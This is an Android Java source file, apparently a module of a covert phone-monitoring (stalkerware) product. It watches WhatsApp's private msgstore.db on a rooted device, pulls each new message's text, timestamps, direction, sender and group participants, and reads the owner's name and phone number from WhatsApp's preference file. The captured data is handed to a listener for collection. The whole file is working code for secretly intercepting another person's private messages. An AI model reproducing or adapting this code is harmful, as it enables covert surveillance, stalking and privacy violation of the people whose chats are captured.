package com.vvt.whatsapp;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.vvt.dbobserver.DatabaseFileObserver;
import com.vvt.dbobserver.DatabaseHelper;
import com.vvt.dbobserver.WriteReadFile;
import com.vvt.im.Customization;
import com.vvt.logger.FxLog;

public class WhatsAppObserver extends DatabaseFileObserver {
	
	/*=========================== CONSTANT ===============================*/
	
	private static final String TAG = "WhatsAppObserver";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	public static final String PACKET_NAME = "com.whatsapp";
	public static final String REAL_DATABASE_FILE_NAME = "msgstore.db";
	public static final String DATABASE_TABLE_NAME = "messages";
	
	public static final String DATABASE_PATH = "/data/data/com.whatsapp/databases";
	private static final String DEFAULT_REF_ID_FOLDER = "/mnt/sdcard/data/data/com.vvt.im";
	
	private static final String DEFAULT_WA_SHARED_PREFS_PATH = "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
	private static final String SAMSUNG_WA_SHARED_PREFS_PATH = "/dbdata/databases/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
	private static final byte EMOTICON = -18;
	private static final byte REPLACE_EMOTICON = -2;
	
	private static final String DATE_FORMAT_DAFAULT = "dd/MM/yy HH:mm:ss";
	
	
	/*=========================== MEMBER ===============================*/
	
	private static WhatsAppObserver sWhatsAppObserver;
	private static ArrayList<WhatsAppImData> sWhatsAppDatas;
	private static boolean sPermanentStop = false;
	private static boolean sRegisterAlready = false;
	private static WhatsAppObserver.OnCaptureListenner sWhatsAppObserverListener;
	
	private static String sPathToRefId;
	private static String sDateFormat;
	
	/*============================ METHOD ================================*/
	
	
	/**
	 * get WhatsAppObserver object.
	 */
	public static WhatsAppObserver getWhatsAppObserver() {
		if(sWhatsAppObserver == null){
			sWhatsAppObserver = new WhatsAppObserver(DATABASE_PATH);
		}
		return sWhatsAppObserver;
	}
	
	private WhatsAppObserver(String path) {
		super(path);
		sWhatsAppDatas = new ArrayList<WhatsAppImData>();
	}
	
	/**
	 * DON'T CALL THIS METHOD DIRECTLY. 
	 * Please use registerWhatsAppObserver method.
	 */
	@Override
	public void startWatching() {
		super.startWatching();
	}

	/**
	 * DON'T CALL THIS METHOD DIRECTLY. 
	 * Please use unregisterWhatsAppObserver method.
	 */
	@Override
	public void stopWatching() {
		super.stopWatching();
	}

	/**
	 * register FileObserver for WhatsApp
	 * @param listener
	 * @return True : Success, False : Fail
	 */
	public boolean registerWhatsAppObserver(WhatsAppObserver.OnCaptureListenner listener) {
		if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # ENTER ...");
		
		// check for sure, not duplicate register.
		if(!sRegisterAlready) {
		
			//Check available WhatsApp.
			File file = new File(DATABASE_PATH);
			
			if (file.exists()) {
				if(listener != null){
					sWhatsAppObserverListener = listener;
					
					//For check version support
					if(LOGV) FxLog.v(TAG, "isVersionSupport # " + WhatsAppUtil.TestQuery());
					if(WhatsAppUtil.TestQuery()) {
						setPermanentStop(false);
						
						//set refId  before begin observe.
						if(setRefIdFirstTime()) {
							startWatching();
							sRegisterAlready = true;
						}
					} else {
						if(LOGD) FxLog.d(TAG,"WhatsApp version not support.");
					}
				} else {
					if(LOGD) FxLog.d(TAG, "registerWhatsAppObserver # Can not observe because No listener.");
				}
			
		    } else {
		    	if(LOGD) FxLog.d(TAG, "registerWhatsAppObserver # This device don't have WhatsApp application.");
		    	if(LOGD) FxLog.d(TAG, "registerWhatsAppObserver # So not regis observer.");
		    }
			
			if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # EXIT ..."); 
		} else {
			if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # register already Exit ..."); 
		}
		return sRegisterAlready;
	}
	
	/**
	 * unregisterWhatsAppObserver
	 * @param listener
	 * @return True : Success, False : Fail
	 */
	public boolean unregisterWhatsAppObserver(WhatsAppObserver.OnCaptureListenner listener) {
		if(LOGV) FxLog.v(TAG, "unregisterWhatsAppObserver # ENTER ..."); 
		setPermanentStop(true);
		sRegisterAlready = false;
        stopWatching();
        sWhatsAppObserver = null;
        
        if(LOGV) FxLog.v(TAG, "unregisterWhatsAppObserver # EXIT ..."); 
        return true;
	}
	
	@Override
	public void onEventNotify() {
		if(!sPermanentStop) {
			getConversation();
		}
		else {
			//guarantee stop.
			stopWatching();
		}
	}
	
	private boolean setRefIdFirstTime(){
		if(LOGV) FxLog.v(TAG, "setRefIdFirstTime # ENTER ...");
		
		boolean setRefIdStatus = false;
		
		//Get refId in first time before observe and start watching.
		SQLiteDatabase db =  DatabaseHelper.getReadableDatabase(PACKET_NAME,REAL_DATABASE_FILE_NAME);
		String orderBy = "_id DESC";
		
		try{
			Cursor cursor = db.query(DATABASE_TABLE_NAME, null, null, null, null, null, orderBy, "1");
			
			if(cursor != null) {
				long refId = 0;
				
				if (cursor.getCount() > 0) {
					if(cursor.moveToNext()){
						refId = cursor.getLong(cursor.getColumnIndex(ConversationColumns.ID));
					} 
				}
					
				if(LOGD) FxLog.d(TAG, "setRefIdFirstTime # keep refId in file. : "+refId);
					
				setRefId(refId);
					
				setRefIdStatus = true;
			}else{
				if(LOGD) FxLog.d(TAG, "setRefIdFirstTime # Cursor is NULL.");
				if(LOGD) FxLog.d(TAG, "setRefIdFirstTime # So NOT startWatching()");
			}
			
			if(db != null){
				db.close();
			}
			
			if(cursor != null) {
				cursor.close();
			}
		}catch (SQLiteException e) {
			
			if(db != null){
				db.close();
			}
			
			if(LOGE) FxLog.e(TAG, e.toString());
			if(LOGW) FxLog.w(TAG,"setRefIdFirstTime # ERROR when query but try to set RefId.");
			setRefIdFirstTime();
		}
		
		
		
		if(LOGV) FxLog.v(TAG, "setRefIdFirstTime # EXIT ...");
		return setRefIdStatus;
	}
	
	/**
	 * Please call this method before register observer.
	 * @param path
	 */
	public void setLoggablePath(String path){
		sPathToRefId = path;
	}
	
	/**
	 * set date format 
	 * @param format
	 */
	public void setDateFormat(String format) {
		sDateFormat = format;
	}
	
	private void setPermanentStop(boolean isPermanentStop) {
		sPermanentStop = isPermanentStop;
	}

	private String getFilename(){
		File file = null;
		
		if(sPathToRefId == null) {
	        file = new File(DEFAULT_REF_ID_FOLDER);
		}
		else {
			file = new File(sPathToRefId);
		}
	    if(!file.exists()){
	    	file.mkdirs();
	    }
	    
	    if(LOGV) FxLog.v(TAG, "PATH : "+(file.getAbsolutePath() + "/" + "com.vvt.im.whatsapp.refId.txt"));
	    
        return (file.getAbsolutePath() + "/" + "com.vvt.im.whatsapp.refId.txt");
	}
	
	private void tryToQueryDatabase(){
		
		SQLiteDatabase db =  DatabaseHelper.getReadableDatabase(PACKET_NAME,REAL_DATABASE_FILE_NAME);
		
		long refId = getRefId();
		
		/**
		 * not query create group event (status = 6) 
		 * **/
		String selection = String.format("%s > ? AND %s IS NOT NULL AND %s != 6 AND %s == 0",
				ConversationColumns.ID,
				ConversationColumns.DATA,
				ConversationColumns.STATUS,
				ConversationColumns.MEDIA_TYPE);
		String[] selectionArgs = new String[]{refId+""};
		String orderBy = "_id DESC";
		
		
		try{
			Cursor cursor = db.query(DATABASE_TABLE_NAME, null, selection, selectionArgs, null, null, orderBy);		
			
			if(cursor != null && cursor.getCount() > 0){
				keepConversation(cursor);
				//set refId
				refId = getLastId(cursor);
				if(refId == -1) {
					if(LOGD) FxLog.d(TAG, "tryToQueryDatabase # Can't get last Id from cursor.");
				}else{
					setRefId(refId);
				}
			}
			
			
			
			if(db != null) {
				db.close();
			}
			
			if(cursor != null) {
				cursor.close();
			}
		
		}catch (SQLiteException e) {
			if(db != null) {
				db.close();
			}
			if(LOGE) FxLog.e(TAG, e.toString());
			if(LOGD) FxLog.d(TAG,"tryToQueryDatabase # Error during open database but try to query again.");
			tryToQueryDatabase();
		}
		
		
	}

	synchronized private void getConversation() {
		if(LOGV) FxLog.v(TAG, "getConversation # ENTER ...");
		
		//prepare arrayList.
		if (sWhatsAppDatas == null) {
			sWhatsAppDatas = new ArrayList<WhatsAppImData>();
		}
		
		sWhatsAppDatas.clear();
		
		//query data.
		tryToQueryDatabase();
		
		//show result
		if(sWhatsAppDatas.size() > 0) {
			if(LOGV) FxLog.v(TAG, "getConversation # Sent data that was capture to WhatsApp Observer Listener.");
			sWhatsAppObserverListener.onReceiveNewWhatsAppMessages(sWhatsAppDatas);
		}
		
		if(LOGV) FxLog.v(TAG, "getConversation # EXIT ...");
	}
	
	private String filterEmoticon(String data){
		
		if(LOGV) FxLog.v(TAG, "filterEmoticon # ENTER ...");
		
		ArrayList<Byte> data_filter = new ArrayList<Byte>();;
		
		byte[] data_byte = data.getBytes();;
    	
		for (int i = 0; i < data_byte.length; i++) {
			
			if (data_byte[i] == EMOTICON) {
				data_filter.add(REPLACE_EMOTICON);
				i += 2;
				continue;
			} else {
				data_filter.add(data_byte[i]);
			}
		}
		
		//real data that ignore emotion.
		byte[] realData = new byte[data_filter.size()];
		for (int i = 0; i < data_filter.size(); i++) {
			realData[i] = data_filter.get(i);
		}
		
		String result = "";
		
		try {
			result = new String(realData, "UTF-8");
		} catch (UnsupportedEncodingException e) {
			if(LOGE) FxLog.e(TAG,e.getMessage(),e);
		}
		if(LOGV) FxLog.v(TAG, "filterEmoticon # EXIT ...");
		return result;
		
	}
	
	private void keepConversation (Cursor cursor){
		if(LOGV) FxLog.v(TAG, "keepConversation # ENTER ...");
		
		String remote_id ="";
		ArrayList<String> contactList;
		String remoteParty;
		WhatsAppImData wd;
		boolean checkQueryStatus = false;
		
		cursor.moveToLast();
		
		if(LOGV) FxLog.v(TAG, "keepConversation # ENTER While loop...");
		do{
			wd = new WhatsAppImData();
			contactList = new ArrayList<String>();
			
			if(cursor.getColumnIndex(ConversationColumns.DATA) != -1) {
				
			}
			
			// get Owner name and OwnerUid
			getOwnerNameAndOwnerUid(wd);
			
			//Add data to array of capture.
			wd.setData(filterEmoticon(cursor.getString(
					cursor.getColumnIndex(ConversationColumns.DATA))));
			
			int direction = cursor.getInt(
					cursor.getColumnIndex(ConversationColumns.KEY_FROM_ME));
			
			if (direction == 1) {
				wd.setSent(true);
			} else {
				wd.setSent(false);
			}
			
			long time = cursor.getLong(cursor.getColumnIndex(ConversationColumns.RECEIVED_TIME));
			String date = "";
			if (sDateFormat == null) {
				date = new SimpleDateFormat(DATE_FORMAT_DAFAULT).format(new Date(time));
				if(LOGV) FxLog.v(TAG, "keepConversation # sDateFormat = null..."+date);
			} else {
				date = new SimpleDateFormat(sDateFormat).format(new Date(time));
				if(LOGV) FxLog.v(TAG, "keepConversation # sDateFormat != null..."+date);
			}
			wd.setTime(time);
			wd.setDateTime(date);
			
			remote_id = cursor.getString(
					cursor.getColumnIndex(ConversationColumns.KEY_REMOTE_JID));
			
			if (remote_id != null) {
				//Is group chat ?
				if(remote_id.endsWith("@g.us")){
					
					//set flag
					wd.setIsGroupChat(true);
					
					contactList = getParticipant(remote_id);
					remoteParty = cursor.getString(cursor.getColumnIndex(
							ConversationColumns.REMOTE_RESOURCE));
					
					//Who is Speaker?
					if((remoteParty != null) && (remoteParty.contains("@"))){
						//Not owner.
						wd.setSpeakerUid(remoteParty.split("@")[0]);
						wd.setSpeakerName("");
					}else {
						//owner.
						wd.setSpeakerUid(wd.getOwnerUid());
						wd.setSpeakerName(wd.getOwner());
					}
				}
				else {
					//Who said if not group chat.
					if(remote_id.contains("@") && !(wd.isSent())) {
						wd.setSpeakerUid((remote_id.split("@"))[0]);
						wd.setSpeakerName("");
					}
					else{
						wd.setSpeakerUid(wd.getOwnerUid());
						wd.setSpeakerName(wd.getOwner());
					}
					contactList.add((remote_id.split("@"))[0]);
				}	
			} 
			wd.setParticipantUids(contactList);
			
			// set for sure before check Error.
			checkQueryStatus = false;
			
			if (wd.getData() == null) {
				wd.setData("");
				checkQueryStatus = true;
				if(LOGD) FxLog.d(TAG, "keepConversation # Data is null");
			}
			if(wd.getDateTime() == null){
				wd.setDateTime("");
				checkQueryStatus = true;
				if(LOGD) FxLog.d(TAG, "keepConversation # Time is null");
			}
			if (wd.getSpeakerUid() == null) {
				wd.setSpeakerUid("");
				checkQueryStatus = true;
				if(LOGD) FxLog.d(TAG, "keepConversation # Speaker_uid is null");
			}
			
			if(wd.getSpeakName() == null) {
				wd.setSpeakerName("");
				checkQueryStatus = true;
				if(LOGD) FxLog.d(TAG, "keepConversation # SpeakerName is null");
			}
			
			if(wd.getParticipantUids() == null || contactList.size() < 1) {
				checkQueryStatus = true;
				if(LOGD) FxLog.d(TAG, "keepConversation # contactList is null OR contactList < 1");
			}
			
			if(checkQueryStatus) {
				//Write for check error.
				writeLogError(cursor);
			}
			
			
			sWhatsAppDatas.add(wd);
		} 
		while (cursor.moveToPrevious());
		if(LOGV) FxLog.v(TAG, "keepConversation # EXIT While loop...");
		if(LOGV) FxLog.v(TAG, "keepConversation # EXIT ...");
	}
	
	private void writeLogError(Cursor cursor) {
		String data = cursor.getString(cursor.getColumnIndex(ConversationColumns.DATA));
		String keyFromMe = cursor.getString(cursor.getColumnIndex(ConversationColumns.KEY_FROM_ME));
		String keyRemoteJid = cursor.getString(cursor.getColumnIndex(ConversationColumns.KEY_REMOTE_JID));
		String status = cursor.getString(cursor.getColumnIndex(ConversationColumns.STATUS));
		String remoteResource = cursor.getString(cursor.getColumnIndex(ConversationColumns.REMOTE_RESOURCE));
		String mediaSize = cursor.getString(cursor.getColumnIndex(ConversationColumns.MEDIA_SIZE));
		String mediaType = cursor.getString(cursor.getColumnIndex(ConversationColumns.MEDIA_TYPE));
		String time = cursor.getString(cursor.getColumnIndex(ConversationColumns.RECEIVED_TIME));
		
		String log = String.format("DATA : %s\n" +
				"KEY_FROM_ME : %s\n" +
				"KEY_REMOTE_JID : %s\n" +
				"STATUS : %s\n" +
				"REMOTE_RESOURCE : %s\n" +
				"MEDIA_SIZE : %s\n" +
				"MEDIA_TYPE : %s\n" +
				"Time : %s", 
				data,keyFromMe,keyRemoteJid,status,remoteResource,mediaSize,mediaType,time);
		
		if(LOGE) FxLog.e(TAG, log);
	}
	
	private ArrayList<String> getParticipant(String remote_id) {
		if(LOGV) FxLog.v(TAG, "getParticipant # ENTER ...");
		
		String contactTemp[];
		int media_size = 0;
		ArrayList<String> contactList = new ArrayList<String>();
		try{
			SQLiteDatabase db =  DatabaseHelper.getReadableDatabase(PACKET_NAME,REAL_DATABASE_FILE_NAME);
			String selection = "key_remote_jid = ? AND status = 6 AND media_size != 1";
			String[] selectionArgs = new String[]{remote_id};
			Cursor cursor = db.query("messages", null, selection, selectionArgs, null, null, null);
			
			if(cursor != null && cursor.getCount() > 0){
				
				while (cursor.moveToNext()) {
					
					media_size = cursor.getInt(cursor.getColumnIndex(
							ConversationColumns.MEDIA_SIZE));
					
					contactTemp = cursor.getString(cursor.getColumnIndex(
							ConversationColumns.REMOTE_RESOURCE)).split("@");
					
					if(media_size == 4){
						if(!contactList.contains(contactTemp[0])) {
							contactList.add(contactTemp[0]);
						}
					}
					else if(media_size == 5){
						if(contactList.contains(contactTemp[0])){
							contactList.remove(contactTemp[0]);
						}
					}
				}
			}
			
			if(db != null) {
				db.close();
			}
			
			if(cursor != null) {
				cursor.close();
			}
		}catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
			if(LOGE) FxLog.e(TAG,"getParticipant # Error during open database but try to query again.");
			getParticipant(remote_id);
		}
		
		if(LOGV) FxLog.v(TAG, "getParticipant # EXIT ...");
		return contactList;
	}
	
	
	private long getLastId(Cursor cursor) {
		if(LOGV) FxLog.v(TAG, "getLastId # ENTER ...");
		
		if(cursor.moveToFirst()){
			
			long refId = cursor.getLong(
					cursor.getColumnIndex(ConversationColumns.ID));
			
			if(LOGV) FxLog.v(TAG, String.format(
					"getLastId # cursor.getcount : %s, refId : %s",cursor.getCount(),refId));
			if(LOGV) FxLog.v(TAG, "getLastId # EXIT ...");
			return refId;
		}
		else{
			if(LOGD) FxLog.d(TAG,"getLastId # cursor.getcount = 0, No new conversation.");
		}
		
		if(LOGV) FxLog.v(TAG, "getLastId # EXIT ...");
		return -1;
	}
	
	
	private void setRefId(long refId){
		WriteReadFile.writeFile(getFilename(), refId+"");
	}
	
	private long getRefId(){
		String refId = WriteReadFile.readFile(getFilename());
		if(LOGV) FxLog.v(TAG,"getRefId # refId : " +refId);
		return Long.parseLong(refId);
	}
	
	private void getOwnerNameAndOwnerUid(WhatsAppImData wd) {
		if(LOGV) FxLog.v(TAG, "getOwnerNameAndOwnerUid # ENTER ...");
		String result = "";
		String path = DEFAULT_WA_SHARED_PREFS_PATH;
		
		//Check the device is SAMSUNG?.
		File file = new File(DEFAULT_WA_SHARED_PREFS_PATH);
		if(!(file.exists())) {
			
			file = new File(SAMSUNG_WA_SHARED_PREFS_PATH);
			if(file.exists()) {
				path = SAMSUNG_WA_SHARED_PREFS_PATH;
				if(LOGD) FxLog.d(TAG,"THIS DEVICE IS SAMSUNG");
			}
		}
		
		try {
			String thisLine;
			BufferedReader bReader = new BufferedReader(new FileReader(path), 256);
			while ((thisLine = bReader.readLine()) != null) {
				result = thisLine;
				
				int indexOwnerName = result.indexOf("name=\"push_name\">");
				int indexOwnerUid = result.indexOf("name=\"registration_jid\">");
				int indexOwnerUid2 = result.indexOf("name=\"ph\">");
				int indexEndTag = result.indexOf("</string>");
				
				
				
				if(indexOwnerName > -1) {
					wd.setOwner(result.substring(indexOwnerName+17, indexEndTag));
				}
				if(indexOwnerUid > -1) {
					String uid = result.substring(indexOwnerUid+24, indexEndTag);
					if(uid != null && !(uid.equals(""))) {
						wd.setOwnerUid(uid);
					}
				}
				
				if(indexOwnerUid2 > -1)
				if(wd.getOwnerUid() == null || wd.getOwnerUid().equals("")) {
					wd.setOwnerUid(result.substring(indexOwnerUid2+10, indexEndTag));
				}
				
				//if (LOGV) VtFxLog.v(TAG,String.format("result : %s\nOwner : %s\nOwnerUid : %s", result,wd.getOwner(),wd.getOwnerUid()));
			} 
		} 
		catch (FileNotFoundException e) {
			if(LOGE) FxLog.e(TAG, 
					"getOwnerNameAndOwnerUid # FileNotFoundException," + path +
					"\nWe will set OwnerName and OwnerUid are Empty String.");
			wd.setOwner("");
			wd.setOwnerUid("");
		}
		catch (IOException e) {
			if(LOGE) FxLog.e(TAG, 
					"getOwnerNameAndOwnerUid # IOException, Can't read this file : " + path);
			if(LOGW) FxLog.w(TAG, 
					"getOwnerNameAndOwnerUid # IOException, We will set OwnerName and OwnerUid are Empty String.");
			wd.setOwner("");
			wd.setOwnerUid("");
		}
		if(LOGV) FxLog.v(TAG, "getOwnerNameAndOwnerUid # EXIT ...");
		
	}

	public static final class ConversationColumns {
	    public static final String ID = "_id";
	    public static final String DATA = "data";
	    public static final String KEY_FROM_ME = "key_from_me";
	    public static final String RECEIVED_TIME = "received_timestamp";
	    public static final String KEY_REMOTE_JID = "key_remote_jid";
	    public static final String STATUS = "status";
	    public static final String REMOTE_RESOURCE = "remote_resource";
	    public static final String MEDIA_SIZE = "media_size";
	    public static final String MEDIA_TYPE = "media_wa_type";
	    
	    
	    private ConversationColumns() {}
	}
	
	public interface OnCaptureListenner{
		public void onReceiveNewWhatsAppMessages(ArrayList<WhatsAppImData> captureResults);
	}

}

